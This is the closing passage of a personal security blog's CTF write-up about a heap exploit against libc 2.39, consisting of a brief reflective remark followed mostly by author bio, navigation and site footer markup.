Yet, thinking about the fact that I successfully exploited a fully patched, modern libc 2.39 binary purely from a one byte overflow and a bit of heap feng shui is also slightly unsettling. If exploiting binaries is still &ldquo;that easy&rdquo;, it really begs the question about which vulnerabilities might still exist out there. But hey, at least this guarantees my job security as a cybersecurity specialist for the next few years&mldr;</p></div><div class="flex author"><img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width=96 height=96 alt="Emanuel Mairoll" src=/img/author_hu_17fff41dbcaade56.jpg><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">Emanuel Mairoll</div><div class="text-sm text-neutral-700 dark:text-neutral-400">Forward & Reverse Engineer</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/rolbk/ target=_blank aria-label=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://www.linkedin.com/in/rolbk/ target=_blank aria-label=Linkedin rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=mailto:sigmoid_flavors_0u@icloud.com target=_blank aria-label=Envelope rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M48 64C21.5 64 0 85.5.0 112c0 15.1 7.1 29.3 19.2 38.4L236.8 313.6c11.4 8.5 27 8.5 38.4.0L492.8 150.4c12.1-9.1 19.2-23.3 19.2-38.4.0-26.5-21.5-48-48-48H48zM0 176V384c0 35.3 28.7 64 64 64H448c35.3.0 64-28.7 64-64V176L294.4 339.2c-22.8 17.1-54 17.1-76.8.0L0 176z"/></svg></span></span></a></div></div></div></div><div class=mb-10></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_posts/412ctf-heap-meanu/index.md data-oid-likes=likes_posts/412ctf-heap-meanu/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/posts/iot4-heislberg/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">Heislberg: The Internet of Toilets</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2024-11-15T00:00:00+00:00>15 November 2024</time>
</span></span></a></span><span><a class="flex text-right group ml-3" href=/posts/hitcon2025-imgc0nv/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">HITCON 2025 – IMGC0NV</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2025-08-29T00:00:00+00:00>29 August 2025</time>
</span></span><span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer></article></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex list-none flex-col sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/acknowledgements/ title=Acknowledgements>Acknowledgements</a></li><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/privacy/ title="Privacy Statement">Privacy</a></li><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/polyring/ title=Polyring>Polyring</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
Emanuel Mairoll</p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://rolbk.com/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>